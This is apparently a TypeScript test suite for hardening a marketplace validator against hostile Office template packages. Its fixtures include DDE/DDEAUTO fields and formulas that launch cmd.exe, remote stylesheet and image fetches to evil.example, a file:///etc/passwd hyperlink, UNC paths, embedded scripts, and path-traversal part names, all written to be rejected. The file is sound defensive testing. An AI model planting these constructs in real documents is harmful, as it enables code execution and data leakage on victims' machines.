// Plan 4 Task 11: template-validator hardening. Each hostile class below was a gap in the R26 scanner (field/PI/formula
// scans only ran on listed parts, rel-type deny-list incomplete, no part-name folding, no per-part budgets).
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { describe, test } from 'node:test';
import { unzipSync, zipSync, strToU8, type Zippable } from 'fflate';
import { validateArtifact } from '../src/marketplace/validate/index.ts';
import { parseXml } from '../src/marketplace/validate/template.ts';
import { sha256Hex } from '../src/marketplace/artifacts.ts';
import type { ManifestV1, UnpackedPackage, ValidationCheck } from '../src/marketplace/types.ts';

const fx = (n: string) => new Uint8Array(readFileSync(new URL(`./fixtures/marketplace/${n}`, import.meta.url)));
const PPTX = fx('board-update.pptx'), DOCX = fx('board-memo.docx'), XLSX = fx('budget-tracker.xlsx');
const PNG = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3, 4]);

function pkgOf(format: string, file: Uint8Array): UnpackedPackage {
  const files = new Map<string, Uint8Array>([[`template.${format}`, file], ['previews/1.png', PNG]]);
  const manifest: ManifestV1 = {
    schema: 'agentic.marketplace/1', id: 'acme/tpl', type: 'template', version: '1.0.0', title: 'T', summary: 'S', license: 'MIT',
    compat: { app: '^1.0.0' }, dependencies: [], permissions: [],
    files: [...files].map(([path, b]) => ({ path, sha256: sha256Hex(b), size: b.length })),
    payload: { format, file: `template.${format}`, previews: ['previews/1.png'] },
  };
  return { files, manifest };
}
const mutate = (b: Uint8Array, edit: (z: Record<string, Uint8Array>) => void): Uint8Array => { const z = unzipSync(b); edit(z); return zipSync(z as Zippable); };
const dec = (b: Uint8Array) => new TextDecoder().decode(b);
const checks = async (fmt: string, bytes: Uint8Array): Promise<ValidationCheck[]> => (await validateArtifact('template', pkgOf(fmt, bytes))).checks;
const rejected = async (fmt: string, bytes: Uint8Array) => (await checks(fmt, bytes)).filter((c) => !c.ok && (c.name === 'ooxml-zip' || c.name === 'no-active-content'));
const T = (t: string) => `http://schemas.openxmlformats.org/officeDocument/2006/relationships/${t}`;
const R = (inner: string) => `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${inner}</Relationships>`;
const W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"';
const docWith = (body: string) => `<?xml version="1.0"?><w:document ${W}><w:body>${body}</w:body></w:document>`;
const fld = (instr: string, tag = 'w:instrText') => `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><${tag}>${instr}</${tag}></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;

describe('hostile: every XML part is scanned, not only the listed ones', () => {
  const cases: [string, string, (z: Record<string, Uint8Array>) => void, Uint8Array][] = [
    ['DOCTYPE in an unlisted part', 'docx', (z) => { z['customXml/item1.xml'] = strToU8('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "x">]><r>&a;</r>'); }, DOCX],
    ['malformed XML in an unlisted part', 'docx', (z) => { z['customXml/item1.xml'] = strToU8('<r><a></r>'); }, DOCX],
    ['xml-stylesheet PI in docProps/app.xml', 'docx', (z) => { z['docProps/app.xml'] = strToU8('<?xml version="1.0"?><?xml-stylesheet href="http://evil.example/x.xsl"?><Properties/>'); }, DOCX],
    ['xml-stylesheet as the very first bytes (no XML declaration)', 'docx', (z) => { z['docProps/core.xml'] = strToU8('<?xml-stylesheet href="http://evil.example/x.xsl"?><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"/>'); }, DOCX],
    ['non-stylesheet PI in a slide', 'pptx', (z) => { z['ppt/slides/slide1.xml'] = strToU8(`<?xml version="1.0"?><?evil run?>${dec(z['ppt/slides/slide1.xml']).replace(/^<\?xml[^>]*\?>/, '')}`); }, PPTX],
    ['DDEAUTO field in the glossary part', 'docx', (z) => { z['word/glossary/document.xml'] = strToU8(docWith(fld(' DDEAUTO c:\\\\cmd.exe "/k calc" '))); }, DOCX],
    ['DDE formula in a table calculated column', 'xlsx', (z) => { z['xl/tables/table1.xml'] = strToU8(`<?xml version="1.0"?><table xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><tableColumns><tableColumn id="1"><calculatedColumnFormula>cmd|' /c calc'!A0</calculatedColumnFormula></tableColumn></tableColumns></table>`); }, XLSX],
    ['DDE formula in a data validation', 'xlsx', (z) => { z['xl/worksheets/sheetx.xml'] = strToU8(`<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><dataValidations><dataValidation><formula1>DDE("a","b","c")</formula1></dataValidation></dataValidations></worksheet>`); }, XLSX],
    ['DDE defined name in the workbook', 'xlsx', (z) => { z['xl/definedx.xml'] = strToU8(`<?xml version="1.0"?><definedNames xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><definedName name="x">cmd|' /c calc'!A0</definedName></definedNames>`); }, XLSX],
    ['script element in an unlisted part', 'pptx', (z) => { z['ppt/extra.xml'] = strToU8('<root><script>alert(1)</script></root>'); }, PPTX],
    ['svgBlip extension element in a slide', 'pptx', (z) => { z['ppt/slides/slide1.xml'] = strToU8(dec(z['ppt/slides/slide1.xml']).replace(/<\/p:sld>\s*$/, '<asvg:svgBlip xmlns:asvg="http://schemas.microsoft.com/office/drawing/2016/SVG/main" r:embed="rId9"/></p:sld>')); }, PPTX],
    ['remote href attribute in VML', 'docx', (z) => { z['word/vmlDrawing9.vml'] = strToU8('<xml xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><v:imagedata o:href="http://evil.example/p.png"/></xml>'); }, DOCX],
    ['UNC src attribute in an unlisted part', 'docx', (z) => { z['word/extra.xml'] = strToU8('<r><frame src="\\\\evil\\share\\x"/></r>'); }, DOCX],
  ];
  for (const [name, fmt, edit, base] of cases) test(name, async () => assert.ok((await rejected(fmt, mutate(base, edit))).length > 0, name));
});

describe('hostile: field instructions', () => {
  const bad: [string, string, string?][] = [
    ['DDE inside delInstrText (tracked deletion)', fld(' DDE a b c ', 'w:delInstrText')],
    ['zero-width space inside the field name', fld(' D\u200bDE a b c ')],
    ['MACROBUTTON', fld(' MACROBUTTON AutoOpen click ')],
    ['DATABASE', fld(' DATABASE \\d "c:\\\\x.mdb" ')],
    ['HYPERLINK to http', fld(' HYPERLINK "http://evil.example/x" ')],
    ['HYPERLINK to file:', fld(' HYPERLINK "file:///etc/passwd" ')],
    ['lowercase fldSimple dde', '<w:fldSimple w:instr=" dde a b c "><w:r><w:t>x</w:t></w:r></w:fldSimple>'],
    ['INCLUDEPICTURE of a remote picture', fld(' INCLUDEPICTURE "http://evil.example/p.png" ')],
    ['name split over three runs', '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> INC</w:instrText></w:r><w:r><w:instrText>LUDE</w:instrText></w:r><w:r><w:instrText>TEXT "x" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'],
    ['instruction text with no fldChar at all', '<w:p><w:r><w:instrText> LINK Excel.Sheet.8 "x.xls" </w:instrText></w:r></w:p>'],
  ];
  for (const [name, body] of bad) test(`rejects ${name}`, async () => assert.ok((await rejected('docx', mutate(DOCX, (z) => { z['word/document.xml'] = strToU8(docWith(body)); }))).length > 0, name));
  const good: [string, string][] = [
    ['HYPERLINK https URL whose path contains "link"', fld(' HYPERLINK "https://example.com/link/import" ')],
    ['HYPERLINK to a bookmark', fld(' HYPERLINK \\l "intro" ')],
    ['REF to a bookmark named link', fld(' REF link_target \\h ')],
    ['PAGE', fld(' PAGE \\* MERGEFORMAT ')],
  ];
  for (const [name, body] of good) test(`accepts ${name}`, async () => assert.deepEqual(await rejected('docx', mutate(DOCX, (z) => { z['word/document.xml'] = strToU8(docWith(body)); })), []));
});

describe('hostile: relationship kinds, content types and part types', () => {
  const kinds = ['attachedTemplate', 'mailMergeSource', 'mailMergeHeaderSource', 'frame', 'slideUpdateInfo', 'slideUpdateUrl', 'subDocument', 'control', 'ctrlProp', 'xmlMaps', 'vbaProjectSignature', 'oleObject?x=1'];
  for (const k of kinds) test(`internal relationship kind ${k} is refused`, async () => {
    const r = await rejected('docx', mutate(DOCX, (z) => { z['word/_rels/settings.xml.rels'] = strToU8(R(`<Relationship Id="a" Type="${T(k)}" Target="document.xml"/>`)); }));
    assert.ok(r.length > 0);
  });
  test('extensibility (customUI) relationship is refused', async () => {
    assert.ok((await rejected('docx', mutate(DOCX, (z) => { z['_rels/.rels'] = strToU8(R(`<Relationship Id="e" Type="http://schemas.microsoft.com/office/2006/relationships/ui/extensibility" Target="word/document.xml"/>`)); }))).length > 0);
  });
  const parts: [string, string][] = [
    ['xl/connections.xml', 'xlsx'], ['xl/externalLinks/externalLink1.xml', 'xlsx'], ['xl/queryTables/queryTable1.xml', 'xlsx'],
    ['customUI/customUI14.xml', 'docx'], ['word/webextensions/webextension1.xml', 'docx'], ['word/media/logo.svgz', 'docx'],
    ['word/media/page.html', 'docx'], ['word/media/x.exe.', 'docx'], ['word/media/x.dll ', 'docx'], ['word/styles.xsl', 'docx'],
  ];
  for (const [p, fmt] of parts) test(`part ${JSON.stringify(p)} is refused`, async () => assert.ok((await rejected(fmt, mutate(fmt === 'docx' ? DOCX : XLSX, (z) => { z[p] = strToU8('<r/>'); }))).length > 0));
  test('image/svg+xml content type is refused', async () => {
    assert.ok((await rejected('docx', mutate(DOCX, (z) => { z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('</Types>', '<Default Extension="vec" ContentType="image/svg+xml"/></Types>')); }))).length > 0);
  });
  test('SVG hidden under a .png name is refused', async () => {
    assert.ok((await rejected('docx', mutate(DOCX, (z) => { z['word/media/image99.png'] = strToU8('  <?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>'); }))).length > 0);
    assert.ok((await rejected('docx', mutate(DOCX, (z) => { z['word/media/image98.jpg'] = strToU8('<html><script>1</script></html>'); }))).length > 0);
  });
});

describe('hostile: percent-encoding and unicode part-name tricks', () => {
  const names = [
    'word/%2e%2e/evil.xml', 'word/..%2fevil.xml', 'word/a%5cb.xml', 'word/%252e%252e/x.xml', 'word/a%00b.xml',
    'word\uff0fextra.xml', 'word/\uff0e\uff0e/x.xml', 'word/doc\u202Exlsx.xml', 'word/a\u200bb.xml', 'word/a\u0007b.xml', 'word/a.xml:evil.exe',
  ];
  for (const n of names) test(`part name ${JSON.stringify(n)} is refused`, async () => assert.ok((await rejected('docx', mutate(DOCX, (z) => { z[n] = strToU8('<r/>'); }))).length > 0));
  test('percent-encoded twin of an existing part is a collision', async () => {
    assert.ok((await rejected('docx', mutate(DOCX, (z) => { z['word/%64ocument.xml'] = strToU8('<r/>'); }))).length > 0);
  });
  test('trailing-dot twin of an existing part is a collision', async () => {
    assert.ok((await rejected('docx', mutate(DOCX, (z) => { z['word/document.xml.'] = strToU8('<r/>'); }))).length > 0);
  });
  test('compatibility-form twin is a collision', async () => {
    assert.ok((await rejected('docx', mutate(DOCX, (z) => { z['word/\uff44ocument.xml'] = strToU8('<r/>'); }))).length > 0);
  });
  test('a relationship target that climbs above the package root is refused even if the clamped path exists', async () => {
    assert.ok((await rejected('docx', mutate(DOCX, (z) => { z['word/_rels/settings.xml.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="../../word/document.xml"/>`)); }))).length > 0);
  });
  test('percent-encoded traversal / backslash / double encoding in a target is refused', async () => {
    for (const t of ['%2e%2e/%2e%2e/word/document.xml', 'styles.xml%5c..%5cdocument.xml', '%252e%252e/word/document.xml']) {
      assert.ok((await rejected('docx', mutate(DOCX, (z) => { z['word/_rels/settings.xml.rels'] = strToU8(R(`<Relationship Id="a" Type="${T('hyperlink')}" Target="${t}"/>`)); }))).length > 0, t);
    }
  });
});

describe('differential findings (OfficeCLI refuses these, so the validator must too)', () => {
  test('a second Override for the same part is refused (OPC: one content type per part)', async () => {
    const r = await rejected('pptx', mutate(PPTX, (z) => {
      const m = /<Override PartName="(\/ppt\/presentation\.xml)"[^>]*\/>/.exec(dec(z['[Content_Types].xml']))!;
      z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('</Types>', `${m[0]}</Types>`));
    }));
    assert.ok(r.some((c) => /duplicate/i.test(c.detail ?? '')), JSON.stringify(r));
  });
  test('a second Default for the same extension is refused', async () => {
    const r = await rejected('docx', mutate(DOCX, (z) => { z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('</Types>', '<Default Extension="xml" ContentType="application/xml"/><Default Extension="XML" ContentType="text/xml"/></Types>')); }));
    assert.ok(r.some((c) => /duplicate/i.test(c.detail ?? '')), JSON.stringify(r));
  });
});

describe('differential findings, round 2 (package-level OPC rules OfficeCLI enforces)', () => {
  const ctEdit = (b: Uint8Array, f: (ct: string) => string) => mutate(b, (z) => { z['[Content_Types].xml'] = strToU8(f(dec(z['[Content_Types].xml']))); });
  const detail = (r: ValidationCheck[]) => r.map((c) => c.detail ?? '').join(' | ');
  test('an Override that retypes a .rels part is refused', async () => {
    const r = await rejected('docx', ctEdit(DOCX, (ct) => ct.replace('</Types>', '<Override PartName="/word/_rels/document.xml.rels" ContentType="application/xml"/></Types>')));
    assert.match(detail(r), /relationship part/i);
  });
  test('an Override of [Content_Types].xml itself is refused', async () => {
    const r = await rejected('xlsx', ctEdit(XLSX, (ct) => ct.replace('</Types>', '<Override PartName="/[Content_Types].xml" ContentType="application/xml"/></Types>')));
    assert.match(detail(r), /\[Content_Types\]/);
  });
  test('the main part must keep its format content type', async () => {
    const r = await rejected('docx', ctEdit(DOCX, (ct) => ct.replace('application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml', 'application/xml')));
    assert.match(detail(r), /main part/i);
  });
  test('a duplicated Relationship Id inside one .rels is refused', async () => {
    const r = await rejected('pptx', mutate(PPTX, (z) => { const s = dec(z['ppt/_rels/presentation.xml.rels']); const m = /<Relationship [^>]*\/>/.exec(s)!; z['ppt/_rels/presentation.xml.rels'] = strToU8(s.replace('</Relationships>', `${m[0]}</Relationships>`)); }));
    assert.match(detail(r), /duplicate relationship id/i);
  });
  test('rels / content-types structure: wrong root, unknown child, missing attributes', async () => {
    for (const [name, edit] of [
      ['wrong rels root', (z: Record<string, Uint8Array>) => { z['_rels/.rels'] = strToU8(dec(z['_rels/.rels']).replace(/Relationships/g, 'Relationshipz')); }],
      ['unknown rels child', (z: Record<string, Uint8Array>) => { z['_rels/.rels'] = strToU8(dec(z['_rels/.rels']).replace('</Relationships>', '<Junk/></Relationships>')); }],
      ['relationship without Target', (z: Record<string, Uint8Array>) => { z['_rels/.rels'] = strToU8(dec(z['_rels/.rels']).replace(/ Target="[^"]*"/, '')); }],
      ['wrong Types root', (z: Record<string, Uint8Array>) => { z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace(/Types>/g, 'Typez>')); }],
      ['unknown Types child', (z: Record<string, Uint8Array>) => { z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('</Types>', '<Junk/></Types>')); }],
      ['rels namespace typo', (z: Record<string, Uint8Array>) => { z['_rels/.rels'] = strToU8(dec(z['_rels/.rels']).replace('openxmlformats.org/package', 'openxmlformats.rg/package')); }],
      ['Types namespace typo', (z: Record<string, Uint8Array>) => { z['[Content_Types].xml'] = strToU8(dec(z['[Content_Types].xml']).replace('content-types', 'cntent-types')); }],
      ['UT-8 declaration', (z: Record<string, Uint8Array>) => { z['_rels/.rels'] = strToU8(dec(z['_rels/.rels']).replace(/encoding=(["'])[^"']*\1/i, 'encoding="UT-8"')); }],
    ] as const) assert.ok((await rejected('docx', mutate(DOCX, edit))).length > 0, name);
  });
});

describe('budgets', () => {
  test('nesting deeper than the cap is refused (tokenizer and validator)', async () => {
    const deep = '<a>'.repeat(5000) + '</a>'.repeat(5000);
    assert.throws(() => parseXml(strToU8(deep)), /nesting/);
    assert.ok((await rejected('docx', mutate(DOCX, (z) => { z['customXml/deep.xml'] = strToU8(deep); }))).length > 0);
  });
  test('the tokenizer honours an expired deadline', () => {
    const big = '<r>' + '<a b="1"/>'.repeat(5000) + '</r>';
    assert.throws(() => parseXml(strToU8(big), undefined, { deadline: Date.now() - 1 }), /time budget/);
  });
  test('one oversized XML part is refused without being parsed', async () => {
    const r = await rejected('docx', mutate(DOCX, (z) => { z['customXml/huge.xml'] = new Uint8Array(33 * 1024 * 1024).fill(0x20); }));
    assert.ok(r.some((c) => /XML part.*over/.test(c.detail ?? '')), JSON.stringify(r));
  });
  test('a nested chart workbook is scanned with the same rules (DOCTYPE in its customXml)', async () => {
    const inner = zipSync({ '[Content_Types].xml': strToU8('<Types/>'), 'customXml/i.xml': strToU8('<!DOCTYPE r []><r/>') });
    const r = await rejected('pptx', mutate(PPTX, (z) => {
      const rk = Object.keys(z).find((n) => /charts\/_rels\/.*\.rels$/.test(n))!;
      z['ppt/embeddings/w0.xlsx'] = inner;
      z[rk] = strToU8(dec(z[rk]).replace('</Relationships>', `<Relationship Id="r0" Type="${T('package')}" Target="../embeddings/w0.xlsx"/></Relationships>`));
    }));
    assert.ok(r.some((c) => /w0\.xlsx: .*customXml\/i\.xml.*DOCTYPE/.test(c.detail ?? '')), JSON.stringify(r));
  });
});
